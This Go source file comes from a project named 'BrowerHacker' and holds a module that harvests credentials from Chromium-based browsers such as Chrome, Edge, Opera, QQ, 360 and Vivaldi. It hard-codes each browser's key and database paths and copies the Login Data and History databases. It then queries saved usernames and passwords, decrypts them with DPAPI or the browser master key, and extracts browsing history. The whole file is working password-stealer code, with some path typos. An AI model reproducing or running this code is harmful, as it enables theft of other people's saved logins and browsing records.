package core

import (
	"BrowerHacker/crypher"
	"database/sql"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"io"
	"os"
	"time"
)

/*
	chromium系列均采用的google的chromium内核，其解密方式都与chrome浏览器相同
	目前市面上常用的chromium内核的浏览器有:
	chrome, chrome-bate, chromium, edge, 360极速, QQ, Opera, Opera-GX, Vivaldi
	他们都采用了chrome8.0往后的加密方式
*/

// 设置chromium系列浏览器的默认路径
const (
	chromekey = `/AppData/Local/Google/Chrome/User Data/Local State`
	chromeprofile = `/AppData/Local/Google/Chrome/User Data/Default/Login Data`
	chromecookies = ``
	chromehistory = `/AppData/Local/Google/Chrome/User Data/Default/History`

	chromebatekey = `/AppData/Local/Google/Chrome Beta/User Data/Local State`
	chromebateprofile = `/AppData/Local/Google/Chrome Beta/User Data/Default/Login Data`
	chromebatecookies = ``
	chromebatehistory = `/AppData/Local/Google/Chrome Beta/User Data/Default/History`

	chromiumkey = `/AppData/Local/Chromium/User Data/Local State`
	chromiumprofile = `/AppData/Local/Chromium/User Data/Defalut/Login Data`
	chromiumcookies = ``
	chromiumhistory = `/AppData/Local/Chromium/User Data/Defalut/History`

	edgekey = `/AppData/Local/Microsoft/Edge/User Data/Local State`
	edgeprofile = `/AppData/Local/Microsoft/Edge/User Data/Default/Login Data`
	edgecookies = ``
	edgehistory = `/AppData/Local/Microsoft/Edge/User Data/Default/History`

	speed360key = `/AppData/Local/360chrome/Chrome/User Data/Local State`
	speed360profile = `/AppData/Local/360chrome/Chrome/User Data/Defalut/Login Data`
	speed360cookies = ``
	speed360history = `/AppData/Local/360chrome/Chrome/User Data/Defalut/History`

	qqbrowerkey = `/AppData/Local/Tencent/QQBrowser/User Data/Local State`
	qqbrowerprofile = `/AppData/Local/Tencent/QQBrowser/User Data/Default/Login Data`
	qqbreowercookies = ``
	qqbrowerhistory = `/AppData/Local/Tencent/QQBrowser/User Data/Default/History`

	operakey = `/AppData/Roaming/Opera Software/Opera Stable/Local State`
	operaprofile = `/AppData/Roaming/Opera Software/Opera Stable/Defalut/Login Data`
	operacookies = ``
	operahistory = `/AppData/Roaming/Opera Software/Opera Stable/Defalut/History`

	operagxkey = `/AppData/Roaming/Opera Software/Opera GX Stable/Local State`
	operagxprofile = `/AppData/Roaming/Opera Software/Opera GX Stable/Defalut/Login Data`
	operagxcookies = ``
	operagxhistory = `/AppData/Roaming/Opera Software/Opera GX Stable/Defalut/History`

	vivaldikey = `/AppData/Local/Vivaldi/Local State`
	vivaldiprofile = `/AppData/Local/Vivaldi/User Data/Default/Login Data`
	vivaldicookies = ``
	vivaldihistory = `/AppData/Local/Vivaldi/User Data/Default/History`

	chromium = `chromium`

	)

// 设置查询sqlite3数据库的查询语句
const(
	chromequery = `SELECT origin_url, username_value, password_value FROM logins`
	chromecookiequery = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`
	chromehistoryquery = `SELECT url, title, visit_count, last_visit_time FROM urls`
	)

// 这里返回用户的环境变量

var userProfile = os.Getenv("USERPROFILE")

// 定义好函数的接口

type ChromiumInterface interface {

	ReturnMasterKey()([]byte,error)

	ReturnMasterData() ([]ChromiumResult,error)

	ReturnHistoryData()([]ChromiumHistory,error)

	CopyDBFileToLocal()error

	CopyHistoryToLocal() error

	ReleaseDBToLocal()error

	ReleaseDBHistory() error
}

// 定义好为接口函数传递变量的结构体

type ChromiumStruct struct {
	Name    string
	Profile string
	KeyPath string
	HistoryPath string
}

// 返回数据的结构体

type ChromiumResult struct {
	HostName string
	PassWord string
	UserName string
}

// 返回history数据的结构体

type ChromiumHistory struct {
	Url string
	Title string
	VisitCount int
	LastVisitTime time.Time
}

// 初始化Chromium接口函数的返回函数

func InitChromium(name,profile,keypath,history string)(ChromiumInterface,error){
	return &ChromiumStruct{
		Name:name,
		Profile: profile,
		KeyPath: keypath,
		HistoryPath: history,
	},nil
}

// int转time

func TimeEpochFormat(epoch int64) time.Time {
	maxTime := int64(99633311740000000)
	if epoch > maxTime {
		return time.Date(2049, 1, 1, 1, 1, 1, 1, time.Local)
	}
	t := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)
	d := time.Duration(epoch)
	for i := 0; i < 1000; i++ {
		t = t.Add(d)
	}
	return t
}

// 初始化ChromiumStrucrt结构体的接口函数

func (c *ChromiumStruct)ReturnMasterKey()([]byte,error){
	// 返回获取到的解密用的masterkey
	if ReturnPathState(c.KeyPath){
	masteKey, err := crypher.ReturnKeyFromLocalState(c.KeyPath)
	if err != nil {
		return []byte(""),err
	}
	return masteKey,nil
	}
	return []byte(""),fmt.Errorf("path is not exist")
}

// 将远程的浏览器密码的路径copy到本地，防止如果浏览器运行时不能获取到Login Data中的数据

func (c *ChromiumStruct)CopyDBFileToLocal()error {
	if ReturnPathState(c.Profile){
		if c.Profile != "" {
			source_open, err := os.Open(c.Profile)
			if err != nil {
				return err
			}
			defer source_open.Close()

			dest_open, err := os.OpenFile("ChromiumDB", os.O_CREATE|os.O_WRONLY, 644)
			if err != nil {
				return err
			}
			defer dest_open.Close()
			_, copy_err := io.Copy(dest_open, source_open)
			if copy_err != nil {
				return copy_err
			} else {
				return nil
			}
		}else{
			return fmt.Errorf("profile path is null")
		}
	}
	return fmt.Errorf("")
}

// 释放复制后的文件

func (c *ChromiumStruct)ReleaseDBToLocal() error{
	return os.Remove("ChromiumDB")
}

func (c *ChromiumStruct)ReleaseDBHistory()error{
	return os.Remove("ChromiumHistory")
}
// 判断文件路径是否存在

func ReturnPathState(path string) bool {
	_,err := os.Stat(path)
	if err != nil {
		if os.IsExist(err){
			return true
		}
		return false
	}
	return true
}

//复制history路径

func (c *ChromiumStruct)CopyHistoryToLocal() error{
	if ReturnPathState(c.HistoryPath){
		if c.Profile != "" {
			source_open, err := os.Open(c.HistoryPath)
			if err != nil {
				return err
			}
			defer source_open.Close()

			dest_open, err := os.OpenFile("ChromiumHistory", os.O_CREATE|os.O_WRONLY, 644)
			if err != nil {
				return err
			}
			defer dest_open.Close()
			_, copy_err := io.Copy(dest_open, source_open)
			if copy_err != nil {
				return copy_err
			} else {
				return nil
			}
		}else{
			return fmt.Errorf("History path is null")
		}
	}
	return fmt.Errorf("")
}

func (c *ChromiumStruct)ReturnMasterData() ([]ChromiumResult,error) {
	// 返回获取到的解密的登陆数据
	var tempData ChromiumResult
	var ReturnResult []ChromiumResult

	conn, err := sql.Open("sqlite3","ChromiumDB")
	if err != nil {
		return []ChromiumResult{}, err
	}
	defer func() {
		_ = conn.Close()
	}()
	rows, err := conn.Query(chromequery)
	if err != nil {
		return []ChromiumResult{}, err
	}
	defer func() {
		_ = rows.Close()
	}()
	for rows.Next() {
		var url string
		var username string
		var password []byte
		err := rows.Scan(&url,&username,&password)
		if err != nil {
			continue
		}
		masterKey, err  := c.ReturnMasterKey()
		if err != nil {
			//fmt.Println(err)
			continue
		}
		var depwd []byte
		if len(masterKey) == 0{
			depwd , err = crypher.WinDecypt(password)
			if err != nil {
				fmt.Println(err)
				continue
			}
		}else{
			depwd, err = crypher.DecryptPwd(password,masterKey)
			if err != nil {
				fmt.Println(err)
				continue
			}
		}

		if username == "" || string(depwd) == ""{
			continue
		}else{
			tempData = ChromiumResult{
				HostName: url,
				UserName: username,
				PassWord: string(depwd),
			}
			ReturnResult = append(ReturnResult,tempData)
		}
	}
	return ReturnResult,nil
}

// 返回history数据的结构体map

func (c *ChromiumStruct)ReturnHistoryData()([]ChromiumHistory,error){
	var TempHistory []ChromiumHistory
	historyDB, err := sql.Open("sqlite3","ChromiumHistory")
	if err != nil {
		return []ChromiumHistory{},err
	}
	defer func() {
		_ = historyDB.Close()
	}()
	rows, err := historyDB.Query(chromehistoryquery)
	if err != nil {
		return []ChromiumHistory{},err
	}
	defer func() {
		_ = rows.Close()
	}()
	for rows.Next(){
		var (
			url,title string
			visitCount int
			lastVistTime int64
		)
		err := rows.Scan(&url,&title,&visitCount,&lastVistTime)
		data := ChromiumHistory{
			Url: url,
			Title: title,
			VisitCount: visitCount,
			LastVisitTime: TimeEpochFormat(lastVistTime),
		}
		if err != nil {
			return []ChromiumHistory{},err
		}
		TempHistory = append(TempHistory,data)
	}
	return TempHistory,nil
}


// 初始化chromium内核的全部浏览器

var ChromiumBrower  = map[string]struct{
	// 定义一个字典，为浏览器名对应相应的struct结构体
	BrowerName string
	BrowerKeyPath string
	BrowerProfilePath string
	BrowerHistory string
	BrowerInterface func(name,profile,keypath,history string)(ChromiumInterface, error)
}{
	"Google Chrome":{
		BrowerKeyPath: userProfile + chromekey,
		BrowerProfilePath: userProfile + chromeprofile,
		BrowerHistory: userProfile + chromehistory,
		BrowerName: chromium,
		BrowerInterface: InitChromium,
	},
	"Google Chrome Bate":{
		BrowerKeyPath: userProfile + chromebatekey,
		BrowerProfilePath: userProfile + chromebateprofile,
		BrowerHistory: userProfile + chromebatehistory,
		BrowerName: chromium,
		BrowerInterface: InitChromium,
	},
	"Microsoft Edge":{
		BrowerKeyPath: userProfile + edgekey,
		BrowerProfilePath: userProfile + edgeprofile,
		BrowerHistory: userProfile + edgehistory,
		BrowerName: chromium,
		BrowerInterface: InitChromium,
	},
	"Google Chromium":{
		BrowerKeyPath: userProfile + chromiumkey,
		BrowerProfilePath: userProfile + chromiumprofile,
		BrowerHistory: userProfile + chromiumhistory,
		BrowerName: chromium,
		BrowerInterface: InitChromium,
	},
	"Opera":{
		BrowerKeyPath: userProfile + operakey,
		BrowerProfilePath: userProfile + operaprofile,
		BrowerHistory: userProfile + operahistory,
		BrowerName: chromium,
		BrowerInterface: InitChromium,
	},
	"QQ Brower":{
		BrowerKeyPath: userProfile + qqbrowerkey,
		BrowerProfilePath: userProfile + qqbrowerprofile,
		BrowerHistory: userProfile + qqbrowerhistory,
		BrowerName: chromium,
		BrowerInterface: InitChromium,
	},
	"Opera GX":{
		BrowerKeyPath: userProfile + operagxkey,
		BrowerProfilePath: userProfile + operagxprofile,
		BrowerHistory: userProfile + operagxhistory,
		BrowerName: chromium,
		BrowerInterface: InitChromium,
	},
	"360 Brower":{
		BrowerKeyPath: userProfile + speed360key,
		BrowerProfilePath: userProfile + speed360profile,
		BrowerHistory: userProfile + speed360history,
		BrowerName: chromium,
		BrowerInterface: InitChromium,
	},
	"Vivaldi":{
		BrowerKeyPath: userProfile + vivaldikey,
		BrowerProfilePath: userProfile + vivaldiprofile,
		BrowerHistory: userProfile + vivaldihistory,
		BrowerName: chromium,
		BrowerInterface: InitChromium,
	},
}

